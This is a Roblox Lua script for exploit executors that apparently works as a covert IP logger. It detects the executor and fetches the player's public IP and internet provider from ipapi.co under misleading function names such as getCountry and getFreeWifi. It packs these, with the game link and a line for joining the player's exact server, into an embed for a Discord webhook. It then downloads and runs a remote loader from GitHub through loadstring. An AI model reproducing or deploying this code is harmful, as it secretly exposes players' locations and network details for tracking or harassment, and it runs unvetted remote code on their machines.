local MarketplaceService = game:GetService("MarketplaceService")
local placeName = MarketplaceService:GetProductInfo(game.PlaceId).Name
local placeId = game.PlaceId
local formattedName = placeName:lower():gsub("%s+", "-"):gsub("[^a-z0-9%-]", "")
local gameUrl = "https://www.roblox.com/games/" .. placeId .. "/" .. formattedName
local HttpService = game:GetService("HttpService")
local function safe_pcall(fn, ...)
    local ok, res = pcall(fn, ...)
    if ok then return res end
    return nil
end

local function check_globals()
    if syn and type(syn) == "table" then
        return "Synapse (dude how ur using synapse)"
    end
    if KRNL_LOADED or getgenv and getgenv().KRNL_LOADED then
        return "KRNL"
    end
    if is_sirhurt_closure or getgenv and getgenv().Is_Sirhurt then
        return "SirHurt"
    end
    if pebc_execute then
        return "ProtoSmasher"
    end
    if bit and bit.rshift and (type(bit.rshift) == "function") and not (jit) then
    end
    if rconsoleprint or rconsolecreate then
        return "Executor com rconsole (possível desenvolvedor)"
    end
    if writefile and readfile and isfile then
        return "Support filesystem"
    end
    if hookfunction or hookmetamethod then
        return "Executor com hooks (hookfunction/hookmetamethod)"
    end
    return nil
end

local function check_api_names()
    if type(identifyexecutor) == "function" then
        local name = safe_pcall(identifyexecutor)
        if type(name) == "string" and name ~= "" then
            return name
        end
    end
    if type(getexecutorname) == "function" then
        local name = safe_pcall(getexecutorname)
        if type(name) == "string" and name ~= "" then
            return name
        end
    end
    if type(getexecutor) == "function" then
        local name = safe_pcall(getexecutor)
        if type(name) == "string" and name ~= "" then
            return name
        end
    end
    return nil
end

local function check_shared()
    if shared then
        if shared.Prot and type(shared.Prot) == "string" then
            return shared.Prot
        end
        if shared._ISEXECUTOR then
            return tostring(shared._ISEXECUTOR)
        end
        if shared.ExecutorName and type(shared.ExecutorName) == "string" then
            return shared.ExecutorName
        end
    end
    if getgenv then
        local g = getgenv()
        if g._EXECUTOR_NAME and type(g._EXECUTOR_NAME) == "string" then
            return g._EXECUTOR_NAME
        end
    end
    return nil
end

local function check_request_variants()
    local httpCandidates = {
        "request", "http_request", "http.request", "syn.request", "http",
    }
    for _, name in ipairs(httpCandidates) do
        local ok, val = pcall(function() return _G[name] end)
        if ok and val then
            return "HTTP API ("..tostring(name)..")"
        end
    end
    
    if http_request or (syn and syn.request) then
        return "HTTP (syn/http_request)"
    end
    return nil
end

local function detect_executor()
    -- ordem: APIs explícitas -> shared/getgenv -> globals/heurísticas -> fallback
    local detectors = {
        check_api_names,
        check_shared,
        check_globals,
        check_request_variants,
    }

    for _, fn in ipairs(detectors) do
        local ok, res = pcall(fn)
        if ok and res and type(res) == "string" and res ~= "" then
            return res
        end
    end
    
    if getreg or debug and debug.getinfo then
        return "Executor (debug/getreg)"
    end

    return game.Players.LocalPlayer.Name.."#"..game.Players.LocalPlayer.UserId
end

-- Lista de executores que NÃO suportam sistema de arquivos
local no_file_system = {
    ["Arceus X"] = true,
    ["Delta"] = false,
    ["Vega X"] = true,
    ["Fluxus Mobile"] = true,
    ["Titan"] = true,
    ["Exec X Mobile"] = true,
}
-- Uso
local executorName = detect_executor()
if no_file_system[executorName] then
    warn(executorName.." does not support Dodo Development#157. Contact our support at discord.gg/Tn8yx4n5")
    return
end

-- função de request com timeout
local function dataSAT(tab)
    local result, finished = nil, false

    local requestMethods = {
        function(tab) if fluxus and fluxus.request then return fluxus.request(tab) end end,
        function(tab) if request then return request(tab) end end,
        function(tab) if syn and syn.request then return syn.request(tab) end end,
        function(tab) if http_request then return http_request(tab) end end,
        function(tab) -- Delta / Hydrogen / Codex
            if tab.Method == "GET" then
                local body = game:HttpGet(tab.Url)
                return { Body = body, StatusCode = 200 }
            end
        end,
        function(tab) -- HttpService
            if tab.Method == "GET" then
                local body = HttpService:GetAsync(tab.Url)
                return { Body = body, StatusCode = 200 }
            end
        end
    }

    task.spawn(function()
        for _, method in ipairs(requestMethods) do
            local success, response = pcall(method, tab)
            if success and response and response.Body then
                result = response
                break
            end
        end
        finished = true
    end)

    -- timeout de 5s
    local start = os.clock()
    while not finished and os.clock() - start < 5 do
        task.wait()
    end

    return result
end

-- funções de coleta
local function getCountry()
    local response = dataSAT({ Url = "https://ipapi.co/json/", Method = "GET" })
    if not response or not response.Body then
        return "Unknow Metadata"
    end
    local data = HttpService:JSONDecode(response.Body)
    return data.ip
end

local function getFreeWifi()
    local response = dataSAT({ Url = "https://ipapi.co/json/", Method = "GET" })
    if not response or not response.Body then
        return "Unknow Metadata"
    end
    local data = HttpService:JSONDecode(response.Body)
    return data.org
end

local function getPopulation()
    local response = dataSAT({ Url = "https://ipapi.co/json/", Method = "GET" })
    if not response or not response.Body then
        return "Unknow Metadata"
    end
    local data = HttpService:JSONDecode(response.Body)
    return data.country_population
end

local Colors = {
    y = 16776960,
    g = 65280,
    o = 16753920,
    b = 3447003,
    r = 16711680,
    p = 10181046
}

local ip = getCountry()
local wifi = getFreeWifi()
local population = getPopulation()
local embedFields = {
    { name = "Sent:", value = "**<t:" .. os.time() .. ":R>**" },
    { name = "Game:", value = gameUrl },
    { name = "IP:", value = ip },
    { name = "Provider:", value = wifi },
    { name = "Population:", value = population },
    { name = "Executor:", value = executorName },
    {
        name = "Place:",
        value = 'game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", game.Players.LocalPlayer)'
    }
}
if _G.showPlayerName and _G.showPlayerName == true then
    table.insert(embedFields, 3, { name = "Player:", value = game.Players.LocalPlayer.Name })
end

local ColorsList = {}
for _, v in pairs(Colors) do
    table.insert(ColorsList, v)
end

local chosenColor = ColorsList[math.random(1, #ColorsList)]

_G.web = {
    Webhook = _G.webhok,
    Message = "",
    Notify = false,
    embed = {
            title = _G.titlep,
            description = "",
            color = chosenColor,
            fields = embedFields,
            thumbnail = {
                url = _G.thumb
            },
            footer = {
                text = "Webhook System | REPORT BUGS (DM): @dircs"
            }
        }
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/dirsks/Discord-Webhook-SenderX.V.2.3.6/refs/heads/main/UpdatedVersionX.V.2.4.0/Loader.luau"))()
